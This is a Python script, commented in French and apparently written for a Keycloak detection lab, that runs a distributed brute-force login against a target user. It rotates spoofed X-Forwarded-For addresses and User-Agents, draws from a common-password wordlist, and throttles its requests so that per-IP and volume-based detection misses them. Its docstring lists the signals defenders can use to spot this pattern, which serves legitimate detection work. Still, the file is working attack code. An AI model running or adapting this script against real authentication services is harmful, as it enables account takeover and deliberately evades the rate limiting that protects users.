"""
ATTAQUE : Login distribué (T1583)
==================================
Simule un attaquant qui utilise un pool de proxies pour répartir
ses tentatives sur plein d'IPs sources différentes (évite les blocages
par IP).

Utilise X-Forwarded-For (Keycloak doit faire confiance à ce header,
ce qui est notre cas en mode dev).

Pattern détectable :
  - Beaucoup d'IPs DIFFÉRENTES tentant le même user
  - User-Agents variés (proxies différents)
  - Peu de tentatives par IP (sous le radar)
  - Mais corrélation temporelle sur 1 user
"""
import sys, time, random, requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.1.16:8080"
TARGET_USER  = sys.argv[2] if len(sys.argv) > 2 else "alice"
N_ATTEMPTS   = int(sys.argv[3]) if len(sys.argv) > 3 else 50

REALM         = "sso-demo"
CLIENT_ID     = "ticket-app"
CLIENT_SECRET = "ticket-app-secret"

# Wordlist commune
PASSWORDS = [
    "123456", "password", "admin", "qwerty", "letmein", "welcome",
    "monkey", "dragon", "P@ssw0rd", "iloveyou", "Welcome2024",
    "Summer2024", "Pass123!", "ChangeMe", "Default1!",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 Safari/16",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148 Safari/604.1",
]


def random_proxy_ip():
    """Génère une IP qui simule un proxy/Tor exit node."""
    # Préfixes typiques de cloud/proxies/Tor
    prefixes = [203, 185, 91, 199, 45, 162, 167]
    return f"{random.choice(prefixes)}.{random.randint(1,254)}." \
           f"{random.randint(1,254)}.{random.randint(1,254)}"


def attempt(user, pwd):
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    headers = {
        "User-Agent":      random.choice(USER_AGENTS),
        "X-Forwarded-For": random_proxy_ip(),
    }
    try:
        r = requests.post(url, data={
            "grant_type":   "password",
            "client_id":    CLIENT_ID,
            "client_secret":CLIENT_SECRET,
            "username":     user,
            "password":     pwd,
        }, headers=headers, timeout=10)
        return r.status_code == 200, headers["X-Forwarded-For"]
    except Exception:
        return False, headers["X-Forwarded-For"]


print(f"[*] Login distribué sur user '{TARGET_USER}'")
print(f"[*] {N_ATTEMPTS} tentatives depuis {N_ATTEMPTS} IPs différentes\n")

for i in range(N_ATTEMPTS):
    pwd = random.choice(PASSWORDS)
    ok, ip = attempt(TARGET_USER, pwd)
    mark = "✓" if ok else "✗"
    print(f"  [{i+1:3d}/{N_ATTEMPTS}] from={ip:18s} pwd={pwd:15s} {mark}")
    # Cadence lente pour rester discret (évite les détections par volume)
    time.sleep(random.uniform(2, 5))

print("\n[*] Terminé.")
